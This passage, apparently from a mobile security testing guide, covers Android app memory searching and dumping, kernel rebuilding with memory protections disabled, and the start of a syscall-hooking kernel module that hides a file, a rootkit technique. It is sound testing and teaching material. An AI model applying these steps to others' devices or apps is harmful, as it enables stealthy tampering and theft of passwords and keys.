\ExtensionTok{0x70654ec5}\NormalTok{ hit0\_3 Hello}
\ExtensionTok{0x7d1c499560}\NormalTok{ hit0\_4 Hello from C++}
\ExtensionTok{0x7d1c4a9560}\NormalTok{ hit0\_5 Hello from C++}
\ExtensionTok{0x7d1c51cef9}\NormalTok{ hit0\_6 HelloWorldJNI}
\ExtensionTok{0x7d30ba11bc}\NormalTok{ hit0\_7 Hello World!}
\ExtensionTok{0x7d39cd796b}\NormalTok{ hit0\_8 Hello.java}
\ExtensionTok{0x7d39d2024d}\NormalTok{ hit0\_9 Hello}\KeywordTok{;}
\ExtensionTok{0x7d3aa4d274}\NormalTok{ hit0\_10 Hello}
\end{Highlighting}
\end{Shaded}

Now you'd like to know where are these addresses actually. You may do so
by running the \texttt{\textbackslash{}dm.} command for all \texttt{@@}
hits matching the glob \texttt{hit0\_*}:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{[}\ExtensionTok{0x00000000}\NormalTok{]}\OperatorTok{>}\NormalTok{ \textbackslash{}dm.@@ hit0\_*}
\ExtensionTok{0x0000000013100000}\NormalTok{ {-} 0x0000000013140000 rw{-} /dev/ashmem/dalvik{-}main space (region space) }\KeywordTok{(}\ExtensionTok{deleted}\KeywordTok{)}
\ExtensionTok{0x0000000013100000}\NormalTok{ {-} 0x0000000013140000 rw{-} /dev/ashmem/dalvik{-}main space (region space) }\KeywordTok{(}\ExtensionTok{deleted}\KeywordTok{)}
\ExtensionTok{0x0000000013100000}\NormalTok{ {-} 0x0000000013140000 rw{-} /dev/ashmem/dalvik{-}main space (region space) }\KeywordTok{(}\ExtensionTok{deleted}\KeywordTok{)}
\ExtensionTok{0x00000000703c2000}\NormalTok{ {-} 0x00000000709b5000 rw{-} /data/dalvik{-}cache/arm64/system@framework@boot{-}framework.art}
\ExtensionTok{0x0000007d1c499000}\NormalTok{ {-} 0x0000007d1c49a000 r{-}x /data/app/sg.vantagepoint.helloworldjni{-}1/lib/arm64/libnative{-}lib.so}
\ExtensionTok{0x0000007d1c4a9000}\NormalTok{ {-} 0x0000007d1c4aa000 r{-}{-} /data/app/sg.vantagepoint.helloworldjni{-}1/lib/arm64/libnative{-}lib.so}
\ExtensionTok{0x0000007d1c516000}\NormalTok{ {-} 0x0000007d1c54d000 r{-}{-} /data/app/sg.vantagepoint.helloworldjni{-}1/base.apk}
\ExtensionTok{0x0000007d30a00000}\NormalTok{ {-} 0x0000007d30c00000 rw{-}}
\ExtensionTok{0x0000007d396bc000}\NormalTok{ {-} 0x0000007d3a998000 r{-}{-} /system/framework/arm64/boot{-}framework.vdex}
\ExtensionTok{0x0000007d396bc000}\NormalTok{ {-} 0x0000007d3a998000 r{-}{-} /system/framework/arm64/boot{-}framework.vdex}
\ExtensionTok{0x0000007d3a998000}\NormalTok{ {-} 0x0000007d3aa9c000 r{-}{-} /system/framework/arm64/boot{-}ext.vdex}
\end{Highlighting}
\end{Shaded}

Additionally, you can search for occurrences of the
\href{https://en.wikipedia.org/wiki/Wide_character}{wide version of the
string} (\texttt{\textbackslash{}/w}) and, again, check their memory
regions:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{[}\ExtensionTok{0x00000000}\NormalTok{]}\OperatorTok{>}\NormalTok{ \textbackslash{}/w Hello}
\ExtensionTok{Searching}\NormalTok{ 10 bytes: 48 00 65 00 6c 00 6c 00 6f 00}
\ExtensionTok{hits}\NormalTok{: 6}
\ExtensionTok{0x13102acc}\NormalTok{ hit1\_0 480065006c006c006f00}
\ExtensionTok{0x13102b9c}\NormalTok{ hit1\_1 480065006c006c006f00}
\ExtensionTok{0x7d30a53aa0}\NormalTok{ hit1\_2 480065006c006c006f00}
\ExtensionTok{0x7d30a872b0}\NormalTok{ hit1\_3 480065006c006c006f00}
\ExtensionTok{0x7d30bb9568}\NormalTok{ hit1\_4 480065006c006c006f00}
\ExtensionTok{0x7d30bb9a68}\NormalTok{ hit1\_5 480065006c006c006f00}

\NormalTok{[}\ExtensionTok{0x00000000}\NormalTok{]}\OperatorTok{>}\NormalTok{ \textbackslash{}dm.@@ hit1\_*}
\ExtensionTok{0x0000000013100000}\NormalTok{ {-} 0x0000000013140000 rw{-} /dev/ashmem/dalvik{-}main space (region space) }\KeywordTok{(}\ExtensionTok{deleted}\KeywordTok{)}
\ExtensionTok{0x0000000013100000}\NormalTok{ {-} 0x0000000013140000 rw{-} /dev/ashmem/dalvik{-}main space (region space) }\KeywordTok{(}\ExtensionTok{deleted}\KeywordTok{)}
\ExtensionTok{0x0000007d30a00000}\NormalTok{ {-} 0x0000007d30c00000 rw{-}}
\ExtensionTok{0x0000007d30a00000}\NormalTok{ {-} 0x0000007d30c00000 rw{-}}
\ExtensionTok{0x0000007d30a00000}\NormalTok{ {-} 0x0000007d30c00000 rw{-}}
\ExtensionTok{0x0000007d30a00000}\NormalTok{ {-} 0x0000007d30c00000 rw{-}}
\end{Highlighting}
\end{Shaded}

They are in the same rw- region as one of the previous strings
(\texttt{0x0000007d30a00000}). Note that searching for the wide versions
of strings is sometimes the only way to find them as you'll see in the
following section.

In-memory search can be very useful to quickly know if certain data is
located in the main app binary, inside a shared library or in another
region. You may also use it to test the behavior of the app regarding
how the data is kept in memory. For instance, you could analyze an app
that performs a login and search for occurrences of the user password.
Also, you may check if you still can find the password in memory after
the login is completed to verify if this sensitive data is wiped from
memory after its use.

In addition, you could use this approach to locate and extract
cryptographic keys. For instance, in the case of an app
encrypting/decrypting data and handling keys in memory instead of using
the AndroidKeyStore API. See the section
``\href{0x05e-Testing-Cryptography.md\#testing-key-management-mstg-storage-1-mstg-crypto-1-and-mstg-crypto-5}{Testing
Key Management}'' in the chapter
``\href{0x05e-Testing-Cryptography.md}{Android Cryptographic APIs}'' for
more details.

Memory Dump

You can dump the app's process memory with
\href{https://github.com/sensepost/objection}{objection} and
\href{https://github.com/Nightbringer21/fridump}{Fridump}. To take
advantage of these tools on a non-rooted device, the Android app must be
repackaged with \texttt{frida-gadget.so} and re-signed. A detailed
explanation of this process is in the section
"\protect\hyperlink{dynamic-analysis-on-non-rooted-devices}{Dynamic
Analysis on Non-Rooted Devices}. To use these tools on a rooted phone,
simply have frida-server installed and running.

\begin{quote}
Note: When using these tools, you might get several memory access
violation errors which can be normally ignored. These tools inject a
Frida agent and try to dump all the mapped memory of the app regardless
of the access permissions (read/write/execute). Therefore, when the
injected Frida agent tries to read a region that's not readable, it'll
return the corresponding \emph{memory access violation errors}. Refer to
previous section ``Memory Maps and Inspection'' for more details.
\end{quote}

With objection it is possible to dump all memory of the running process
on the device by using the command \texttt{memory\ dump\ all}.

\begin{verbatim}
$ objection --gadget sg.vantagepoint.helloworldjni explore

sg.vantagepoint.helloworldjni on (google: 8.1.0) [usb] # memory dump all /Users/foo/memory_Android/memory

Will dump 719 rw- images, totalling 1.6 GiB
Dumping 1002.8 MiB from base: 0x14140000  [------------------------------------]    0%  00:11:03(session detach message) process-terminated
Dumping 8.0 MiB from base: 0x7fc753e000  [####################################]  100%
Memory dumped to file: /Users/foo/memory_Android/memory
\end{verbatim}

\begin{quote}
In this case there was an error, which is probably due to memory access
violations as we already anticipated. This error can be safely ignored
as long as we are able to see the extracted dump in the file system. If
you have any problems, a first step would be to enable the debug flag
\texttt{-d} when running objection or, if that doesn't help, file an
issue in
\href{https://github.com/sensepost/objection/issues}{objection's
GitHub}.
\end{quote}

Next, we are able to find the ``Hello from C++'' strings with radare2:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ }\ExtensionTok{r2}\NormalTok{ /Users/foo/memory\_Android/memory}
\NormalTok{[}\ExtensionTok{0x00000000}\NormalTok{]}\OperatorTok{>}\NormalTok{ izz\textasciitilde{}Hello from}
\ExtensionTok{1136}\NormalTok{ 0x00065270 0x00065270  14  15 () }\ExtensionTok{ascii}\NormalTok{ Hello from C++}
\end{Highlighting}
\end{Shaded}

Alternatively you can use Fridump. This time, we will input a string and
see if we can find it in the memory dump. For this, open the
\href{https://github.com/OWASP/MSTG-Hacking-Playground/tree/master/Android}{MSTG
Hacking Playground} app, navigate to ``OMTG\_DATAST\_002\_LOGGING'' and
enter ``owasp-mstg'' to the password field. Next, run Fridump:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{python3}\NormalTok{ fridump.py {-}U sg.vp.owasp\_mobile.omtg\_android {-}s}

\ExtensionTok{Current}\NormalTok{ Directory: /Users/foo/git/fridump}
\ExtensionTok{Output}\NormalTok{ directory is set to: /Users/foo/git/fridump/dump}
\ExtensionTok{Starting}\NormalTok{ Memory dump...}
\ExtensionTok{Oops}\NormalTok{, memory access violation!{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}] 0.28\% Complete}
\ExtensionTok{Progress}\NormalTok{: [\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#] 99.58\% Complete}
\ExtensionTok{Running}\NormalTok{ strings on all files:}
\ExtensionTok{Progress}\NormalTok{: [\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#] 100.0\% Complete}

\ExtensionTok{Finished}\NormalTok{!}
\end{Highlighting}
\end{Shaded}

\begin{quote}
Tip: Enable verbosity by including the flag \texttt{-v} if you want to
see more details, e.g.~the regions provoking memory access violations.
\end{quote}

It will take a while until it's completed and you'll get a collection of
*.data files inside the dump folder. When you add the \texttt{-s} flag,
all strings are extracted from the dumped raw memory files and added to
the file \texttt{strings.txt}, which is also stored in the dump
directory.

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{ls}\NormalTok{ dump/}
\ExtensionTok{dump/1007943680\_dump.data}\NormalTok{ dump/357826560\_dump.data  dump/630456320\_dump.data ... strings.txt}
\end{Highlighting}
\end{Shaded}

Finally, search for the input string in the dump directory:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ }\FunctionTok{grep}\NormalTok{ {-}nri owasp{-}mstg dump/}
\ExtensionTok{Binary}\NormalTok{ file dump//316669952\_dump.data matches}
\ExtensionTok{Binary}\NormalTok{ file dump//strings.txt matches}
\end{Highlighting}
\end{Shaded}

The ``owasp-mstg'' string can be found in one of the dump files as well
as in the processed strings file.

Runtime Reverse Engineering

Runtime reverse engineering can be seen as the on-the-fly version of
reverse engineering where you don't have the binary data to your host
computer. Instead, you'll analyze it straight from the memory of the
app.

We'll keep using the HelloWorld JNI app, open a session with r2frida
\texttt{r2\ frida://usb//sg.vantagepoint.helloworldjni} and you can
start by displaying the target binary information by using the
\texttt{\textbackslash{}i} command:

\begin{verbatim}
[0x00000000]> \i
arch                arm
bits                64
os                  linux
pid                 13215
uid                 10096
objc                false
runtime             V8
java                true
cylang              false
pageSize            4096
pointerSize         8
codeSigningPolicy   optional
isDebuggerAttached  false
cwd                 /
dataDir             /data/user/0/sg.vantagepoint.helloworldjni
codeCacheDir        /data/user/0/sg.vantagepoint.helloworldjni/code_cache
extCacheDir         /storage/emulated/0/Android/data/sg.vantagepoint.helloworldjni/cache
obbDir              /storage/emulated/0/Android/obb/sg.vantagepoint.helloworldjni
filesDir            /data/user/0/sg.vantagepoint.helloworldjni/files
noBackupDir         /data/user/0/sg.vantagepoint.helloworldjni/no_backup
codePath            /data/app/sg.vantagepoint.helloworldjni-1/base.apk
packageName         sg.vantagepoint.helloworldjni
androidId           c92f43af46f5578d
cacheDir            /data/local/tmp
jniEnv              0x7d30a43c60
\end{verbatim}

Search all symbols of a certain module with
\texttt{\textbackslash{}is\ \textless{}lib\textgreater{}},
e.g.~\texttt{\textbackslash{}is\ libnative-lib.so}.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{[}\ExtensionTok{0x00000000}\NormalTok{]}\OperatorTok{>}\NormalTok{ \textbackslash{}is libnative{-}lib.so}

\NormalTok{[}\ExtensionTok{0x00000000}\NormalTok{]}\OperatorTok{>}
\end{Highlighting}
\end{Shaded}

Which are empty in this case. Alternatively, you might prefer to look
into the imports/exports. For example, list the imports with
\texttt{\textbackslash{}ii\ \textless{}lib\textgreater{}}:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{[}\ExtensionTok{0x00000000}\NormalTok{]}\OperatorTok{>}\NormalTok{ \textbackslash{}ii libnative{-}lib.so}
\ExtensionTok{0x7dbe1159d0}\NormalTok{ f \_\_cxa\_finalize /system/lib64/libc.so}
\ExtensionTok{0x7dbe115868}\NormalTok{ f \_\_cxa\_atexit /system/lib64/libc.so}
\end{Highlighting}
\end{Shaded}

And list the exports with
\texttt{\textbackslash{}iE\ \textless{}lib\textgreater{}}:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{[}\ExtensionTok{0x00000000}\NormalTok{]}\OperatorTok{>}\NormalTok{ \textbackslash{}iE libnative{-}lib.so}
\ExtensionTok{0x7d1c49954c}\NormalTok{ f Java\_sg\_vantagepoint\_helloworldjni\_MainActivity\_stringFromJNI}
\end{Highlighting}
\end{Shaded}

\begin{quote}
For big binaries it's recommended to pipe the output to the internal
less program by appending \texttt{\textasciitilde{}..},
i.e.~\texttt{\textbackslash{}ii\ libandroid\_runtime.so\textasciitilde{}..}
(if not, for this binary, you'd get almost 2500 lines printed to your
terminal).
\end{quote}

The next thing you might want to look at are the \textbf{currently
loaded} Java classes:

\begin{verbatim}
[0x00000000]> \ic~sg.vantagepoint.helloworldjni
sg.vantagepoint.helloworldjni.MainActivity
\end{verbatim}

List class fields:

\begin{verbatim}
[0x00000000]> \ic sg.vantagepoint.helloworldjni.MainActivity~sg.vantagepoint.helloworldjni
public native java.lang.String sg.vantagepoint.helloworldjni.MainActivity.stringFromJNI()
public sg.vantagepoint.helloworldjni.MainActivity()
\end{verbatim}

Note that we've filtered by package name as this is the
\texttt{MainActivity} and it includes all methods from Android's
\texttt{Activity} class.

You can also display information about the class loader:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{[}\ExtensionTok{0x00000000}\NormalTok{]}\OperatorTok{>}\NormalTok{ \textbackslash{}icL}
\ExtensionTok{dalvik.system.PathClassLoader}\NormalTok{[}
 \ExtensionTok{DexPathList}\NormalTok{[}
\NormalTok{  [}
   \ExtensionTok{directory} \StringTok{"."}\NormalTok{]}
\NormalTok{  ,}
  \VariableTok{nativeLibraryDirectories=}\NormalTok{[}
   \ExtensionTok{/system}\NormalTok{/}\ExtensionTok{lib64}\NormalTok{,}
    \ExtensionTok{/vendor}\NormalTok{/}\ExtensionTok{lib64}\NormalTok{,}
    \ExtensionTok{/system}\NormalTok{/}\ExtensionTok{lib64}\NormalTok{,}
    \ExtensionTok{/vendor}\NormalTok{/}\ExtensionTok{lib64}\NormalTok{]}
\NormalTok{  ]}
\NormalTok{ ]}
\ExtensionTok{java.lang.BootClassLoader@b1f1189dalvik.system.PathClassLoader}\NormalTok{[}
 \ExtensionTok{DexPathList}\NormalTok{[}
\NormalTok{  [}
   \FunctionTok{zip}\NormalTok{ file }\StringTok{"/data/app/sg.vantagepoint.helloworldjni{-}1/base.apk"}\NormalTok{]}
\NormalTok{  ,}
  \VariableTok{nativeLibraryDirectories=}\NormalTok{[}
   \ExtensionTok{/data/app/sg.vantagepoint.helloworldjni{-}1/lib}\NormalTok{/}\ExtensionTok{arm64}\NormalTok{,}
    \ExtensionTok{/data/app/sg.vantagepoint.helloworldjni{-}1}\NormalTok{/}\ExtensionTok{base.apk}\NormalTok{!/lib/arm64{-}v8a,}
    \ExtensionTok{/system}\NormalTok{/}\ExtensionTok{lib64}\NormalTok{,}
    \ExtensionTok{/vendor}\NormalTok{/}\ExtensionTok{lib64}\NormalTok{]}
\NormalTok{  ]}
\NormalTok{ ]}
\end{Highlighting}
\end{Shaded}

Next, imagine that you are interested into the method exported by
libnative-lib.so
\texttt{0x7d1c49954c\ f\ Java\_sg\_vantagepoint\_helloworldjni\_MainActivity\_stringFromJNI}.
You can seek to that address with \texttt{s\ 0x7d1c49954c}, analyze that
function \texttt{af} and print 10 lines of its disassembly
\texttt{pd\ 10}:

\begin{verbatim}
[0x7d1c49954c]> pdf
            ;-- sym.fun.Java_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI:
╭ (fcn) fcn.7d1c49954c 18
│   fcn.7d1c49954c (int32_t arg_40f942h);
│           ; arg int32_t arg_40f942h @ x29+0x40f942
│           0x7d1c49954c      080040f9       ldr x8, [x0]
│           0x7d1c499550      01000090       adrp x1, 0x7d1c499000
│           0x7d1c499554      21801591       add x1, x1, 0x560         ; hit0_4
│           0x7d1c499558      029d42f9       ldr x2, [x8, 0x538]       ; [0x538:4]=-1 ; 1336
│           0x7d1c49955c      4000           invalid
\end{verbatim}

Note that the line tagged with \texttt{;\ hit0\_4} corresponds to the
string that we've previously found:
\texttt{0x7d1c499560\ hit0\_4\ Hello\ from\ C++}.

To learn more, please refer to the
\href{https://github.com/enovella/r2frida-wiki/blob/master/README.md}{r2frida
wiki}.

\hypertarget{customizing-android-for-reverse-engineering}{%
\subsubsection{Customizing Android for Reverse
Engineering}\label{customizing-android-for-reverse-engineering}}

Working on real devices has advantages, especially for interactive,
debugger-supported static/dynamic analysis. For example, working on a
real device is simply faster. Also, Running the target app on a real
device is less likely to trigger defenses. Instrumenting the live
environment at strategic points gives you useful tracing functionality
and the ability to manipulate the environment, which will help you
bypass any anti-tampering defenses the app might implement.

\hypertarget{customizing-the-ramdisk}{%
\paragraph{Customizing the RAMDisk}\label{customizing-the-ramdisk}}

Initramfs is a small CPIO archive stored inside the boot image. It
contains a few files that are required at boot, before the actual root
file system is mounted. On Android, initramfs stays mounted
indefinitely. It contains an important configuration file, default.prop,
that defines some basic system properties. Changing this file can make
the Android environment easier to reverse engineer. For our purposes,
the most important settings in default.prop are \texttt{ro.debuggable}
and \texttt{ro.secure}.

\begin{verbatim}
$ cat /default.prop
#
# ADDITIONAL_DEFAULT_PROPERTIES
#
ro.secure=1
ro.allow.mock.location=0
ro.debuggable=1
ro.zygote=zygote32
persist.radio.snapshot_enabled=1
persist.radio.snapshot_timer=2
persist.radio.use_cc_names=true
persist.sys.usb.config=mtp
rild.libpath=/system/lib/libril-qc-qmi-1.so
camera.disable_zsl_mode=1
ro.adb.secure=1
dalvik.vm.dex2oat-Xms=64m
dalvik.vm.dex2oat-Xmx=512m
dalvik.vm.image-dex2oat-Xms=64m
dalvik.vm.image-dex2oat-Xmx=64m
ro.dalvik.vm.native.bridge=0
\end{verbatim}

Setting \texttt{ro.debuggable} to ``1'' makes all running apps
debuggable (i.e., the debugger thread will run in every process),
regardless of the value of the \texttt{android:debuggable} attribute in
the Android Manifest. Setting \texttt{ro.secure} to ``0'' causes adbd to
run as root. To modify initrd on any Android device, back up the
original boot image with TWRP or dump it with the following command:

\begin{verbatim}
$ adb shell cat /dev/mtd/mtd0 >/mnt/sdcard/boot.img
$ adb pull /mnt/sdcard/boot.img /tmp/boot.img
\end{verbatim}

To extract the contents of the boot image, use the abootimg tool as
described in Krzysztof Adamski's how-to :

\begin{verbatim}
$ mkdir boot
$ cd boot
$ ../abootimg -x /tmp/boot.img
$ mkdir initrd
$ cd initrd
$ cat ../initrd.img | gunzip | cpio -vid
\end{verbatim}

Note the boot parameters written to bootimg.cfg; you'll need them when
booting your new kernel and ramdisk.

\begin{verbatim}
$ ~/Desktop/abootimg/boot$ cat bootimg.cfg
bootsize = 0x1600000
pagesize = 0x800
kerneladdr = 0x8000
ramdiskaddr = 0x2900000
secondaddr = 0xf00000
tagsaddr = 0x2700000
name =
cmdline = console=ttyHSL0,115200,n8 androidboot.hardware=hammerhead user_debug=31 maxcpus=2 msm_watchdog_v2.enable=1
\end{verbatim}

Modify default.prop and package your new ramdisk:

\begin{verbatim}
$ cd initrd
$ find . | cpio --create --format='newc' | gzip > ../myinitd.img
\end{verbatim}

\hypertarget{customizing-the-android-kernel}{%
\paragraph{Customizing the Android
Kernel}\label{customizing-the-android-kernel}}

The Android kernel is a powerful ally to the reverse engineer. Although
regular Android apps are hopelessly restricted and sandboxed, you, the
reverser, can customize and alter the behavior of the operating system
and kernel any way you wish. This gives you an advantage because most
integrity checks and anti-tampering features ultimately rely on services
performed by the kernel. Deploying a kernel that abuses this trust and
unabashedly lies about itself and the environment, goes a long way in
defeating most reversing defenses that malware authors (or normal
developers) can throw at you.

Android apps have several ways to interact with the OS. Interacting
through the Android Application Framework's APIs is standard. At the
lowest level, however, many important functions (such as allocating
memory and accessing files) are translated into old-school Linux system
calls. On ARM Linux, system calls are invoked via the SVC instruction,
which triggers a software interrupt. This interrupt calls the
\texttt{vector\_swi} kernel function, which then uses the system call
number as an offset into a table (known as sys\_call\_table on Android)
of function pointers.

The most straightforward way to intercept system calls is to inject your
own code into kernel memory, then overwrite the original function in the
system call table to redirect execution. Unfortunately, current stock
Android kernels enforce memory restrictions that prevent this.
Specifically, stock Lollipop and Marshmallow kernels are built with the
CONFIG\_STRICT\_MEMORY\_RWX option enabled. This prevents writing to
kernel memory regions marked as read-only, so any attempt to patch
kernel code or the system call table result in a segmentation fault and
reboot. To get around this, build your own kernel. You can then
deactivate this protection and make many other useful customizations
that simplify reverse engineering. If you reverse Android apps on a
regular basis, building your own reverse engineering sandbox is a
no-brainer.

For hacking, I recommend an AOSP-supported device. Google's Nexus
smartphones and tablets are the most logical candidates because kernels
and system components built from the AOSP run on them without issues.
Sony's Xperia series is also known for its openness. To build the AOSP
kernel, you need a toolchain (a set of programs for cross-compiling the
sources) and the appropriate version of the kernel sources. Follow
Google's instructions to identify the correct git repo and branch for a
given device and Android version.

\url{https://source.android.com/source/building-kernels.html\#id-version}

For example, to get kernel sources for Lollipop that are compatible with
the Nexus 5, you need to clone the \texttt{msm} repository and check out
one of the \texttt{android-msm-hammerhead} branches (hammerhead is the
codename of the Nexus 5, and finding the right branch is confusing).
Once you have downloaded the sources, create the default kernel config
with the command \texttt{make\ hammerhead\_defconfig} (replacing
``hammerhead'' with your target device).

\begin{verbatim}
$ git clone https://android.googlesource.com/kernel/msm.git
$ cd msm
$ git checkout origin/android-msm-hammerhead-3.4-lollipop-mr1
$ export ARCH=arm
$ export SUBARCH=arm
$ make hammerhead_defconfig
$ vim .config
\end{verbatim}

I recommend using the following settings to add loadable module support,
enable the most important tracing facilities, and open kernel memory for
patching.

\begin{verbatim}
CONFIG_MODULES=Y
CONFIG_STRICT_MEMORY_RWX=N
CONFIG_DEVMEM=Y
CONFIG_DEVKMEM=Y
CONFIG_KALLSYMS=Y
CONFIG_KALLSYMS_ALL=Y
CONFIG_HAVE_KPROBES=Y
CONFIG_HAVE_KRETPROBES=Y
CONFIG_HAVE_FUNCTION_TRACER=Y
CONFIG_HAVE_FUNCTION_GRAPH_TRACER=Y
CONFIG_TRACING=Y
CONFIG_FTRACE=Y
CONFIG KDB=Y
\end{verbatim}

Once you're finished editing save the .config file, build the kernel.

\begin{verbatim}
$ export ARCH=arm
$ export SUBARCH=arm
$ export CROSS_COMPILE=/path_to_your_ndk/arm-eabi-4.8/bin/arm-eabi-
$ make
\end{verbatim}

You can now create a standalone toolchain for cross-compiling the kernel
and subsequent tasks. To create a toolchain for Android 7.0 (API level
24), run make-standalone-toolchain.sh from the Android NDK package:

\begin{verbatim}
$ cd android-ndk-rXXX
$ build/tools/make-standalone-toolchain.sh --arch=arm --platform=android-24 --install-dir=/tmp/my-android-toolchain
\end{verbatim}

Set the CROSS\_COMPILE environment variable to point to your NDK
directory and run ``make'' to build the kernel.

\begin{verbatim}
$ export CROSS_COMPILE=/tmp/my-android-toolchain/bin/arm-eabi-
$ make
\end{verbatim}

\hypertarget{booting-the-custom-environment}{%
\paragraph{Booting the Custom
Environment}\label{booting-the-custom-environment}}

Before booting into the new kernel, make a copy of your device's
original boot image. Find the boot partition:

\begin{verbatim}
root@hammerhead:/dev # ls -al /dev/block/platform/msm_sdcc.1/by-name/
lrwxrwxrwx root     root              1970-08-30 22:31 DDR -> /dev/block/mmcblk0p24
lrwxrwxrwx root     root              1970-08-30 22:31 aboot -> /dev/block/mmcblk0p6
lrwxrwxrwx root     root              1970-08-30 22:31 abootb -> /dev/block/mmcblk0p11
lrwxrwxrwx root     root              1970-08-30 22:31 boot -> /dev/block/mmcblk0p19
(...)
lrwxrwxrwx root     root              1970-08-30 22:31 userdata -> /dev/block/mmcblk0p28
\end{verbatim}

Then dump the whole thing into a file:

\begin{verbatim}
$ adb shell "su -c dd if=/dev/block/mmcblk0p19 of=/data/local/tmp/boot.img"
$ adb pull /data/local/tmp/boot.img
\end{verbatim}

Next, extract the ramdisk and information about the structure of the
boot image. There are various tools that can do this; I used Gilles
Grandou's abootimg tool. Install the tool and run the following command
on your boot image:

\begin{verbatim}
$ abootimg -x boot.img
\end{verbatim}

This should create the files bootimg.cfg, initrd.img, and zImage (your
original kernel) in the local directory.

You can now use fastboot to test the new kernel. The
\texttt{fastboot\ boot} command allows you to run the kernel without
actually flashing it (once you're sure everything works, you can make
the changes permanent with fastboot flash, but you don't have to).
Restart the device in fastboot mode with the following command:

\begin{verbatim}
$ adb reboot bootloader
\end{verbatim}

Then use the \texttt{fastboot\ boot} command to boot Android with the
new kernel. Specify the kernel offset, ramdisk offset, tags offset, and
command line (use the values listed in your extracted bootimg.cfg) in
addition to the newly built kernel and the original ramdisk.

\begin{verbatim}
$ fastboot boot zImage-dtb initrd.img --base 0 --kernel-offset 0x8000 --ramdisk-offset 0x2900000 --tags-offset 0x2700000 -c "console=ttyHSL0,115200,n8 androidboot.hardware=hammerhead user_debug=31 maxcpus=2 msm_watchdog_v2.enable=1"
\end{verbatim}

The system should now boot normally. To quickly verify that the correct
kernel is running, navigate to \textbf{Settings} -\textgreater{}
\textbf{About phone} and check the \textbf{kernel version} field.

\begin{figure}
\centering
\includegraphics[width=3.125in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/79cc611a9662b42c800f698e259e4a68828ed1c9.jpg}
\caption{Custom Kernel}
\end{figure}

\hypertarget{system-call-hooking-with-kernel-modules}{%
\paragraph{System Call Hooking with Kernel
Modules}\label{system-call-hooking-with-kernel-modules}}

System call hooking allows you to attack any anti-reversing defenses
that depend on kernel-provided functionality. With your custom kernel in
place, you can now use an LKM to load additional code into the kernel.
You also have access to the /dev/kmem interface, which you can use to
patch kernel memory on-the-fly. This is a classic Linux rootkit
technique that has been described for Android by Dong-Hoon You in Phrack
Magazine - ``Android platform based linux kernel rootkit'' on 4 April
2011.

\begin{figure}
\centering
\includegraphics[width=4.16667in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/2b3a00354d9a95a605f5ab9905e3b4d4e39d9c5a.jpg}
\caption{Images/Chapters/0x05c/syscall\_hooking.jpg}
\end{figure}

You first need the address of sys\_call\_table. Fortunately, it is
exported as a symbol in the Android kernel (iOS reversers aren't so
lucky). You can look up the address in the /proc/kallsyms file:

\begin{verbatim}
$ adb shell "su -c echo 0 > /proc/sys/kernel/kptr_restrict"
$ adb shell cat /proc/kallsyms | grep sys_call_table
c000f984 T sys_call_table
\end{verbatim}

This is the only memory address you need for writing your kernel
module---you can calculate everything else with offsets taken from the
kernel headers (hopefully, you didn't delete them yet).

\hypertarget{example-file-hiding}{%
\subparagraph{Example: File Hiding}\label{example-file-hiding}}

In this how-to, we will use a Kernel module to hide a file. Create a
file on the device so you can hide it later:

\begin{verbatim}
$ adb shell "su -c echo ABCD > /data/local/tmp/nowyouseeme"
$ adb shell cat /data/local/tmp/nowyouseeme
ABCD
\end{verbatim}

It's time to write the kernel module. For file-hiding, you'll need to
hook one of the system calls used to open (or check for the existence
of) files. There are many of these: \texttt{open}, \texttt{openat},
\texttt{access}, \texttt{accessat}, \texttt{facessat}, \texttt{stat},
\texttt{fstat}, etc. For now, you'll only hook the \texttt{openat}
system call. This is the syscall that the /bin/cat program uses when
accessing a file, so the call should be suitable for a demonstration.

You can find the function prototypes for all system calls in the kernel
header file arch/arm/include/asm/unistd.h. Create a file called
kernel\_hook.c with the following code:

\begin{Shaded}
\begin{Highlighting}[]
\PreprocessorTok{\#include }\ImportTok{<linux/kernel.h>}
\PreprocessorTok{\#include }\ImportTok{<linux/module.h>}
\PreprocessorTok{\#include }\ImportTok{<linux/moduleparam.h>}
\PreprocessorTok{\#include }\ImportTok{<linux/unistd.h>}
\PreprocessorTok{\#include }\ImportTok{<linux/slab.h>}
\PreprocessorTok{\#include }\ImportTok{<asm/uaccess.h>}

\NormalTok{asmlinkage }\DataTypeTok{int}\NormalTok{ (*real\_openat)(}\DataTypeTok{int}\NormalTok{, }\DataTypeTok{const} \DataTypeTok{char}\NormalTok{ \_\_user*, }\DataTypeTok{int}\NormalTok{);}

\DataTypeTok{void}\NormalTok{ **sys\_call\_table;}

\DataTypeTok{int}\NormalTok{ new\_openat(}\DataTypeTok{int}\NormalTok{ dirfd, }\DataTypeTok{const} \DataTypeTok{char}\NormalTok{ \textbackslash{}\_\_user* pathname, }\DataTypeTok{int}\NormalTok{ flags)}
\NormalTok{\{}
  \DataTypeTok{char}\NormalTok{ *kbuf;}
  \DataTypeTok{size\_t}\NormalTok{ len;}

\NormalTok{  kbuf=(}\DataTypeTok{char}\NormalTok{*)kmalloc(}\DecValTok{256}\NormalTok{,GFP\_KERNEL);}
\NormalTok{  len = strncpy\_from\_user(kbuf,pathname,}\DecValTok{255}\NormalTok{);}

  \ControlFlowTok{if}\NormalTok{ (strcmp(kbuf, }\StringTok{"/data/local/tmp/nowyouseeme"}\NormalTok{) == }\DecValTok{0}\NormalTok{) \{}
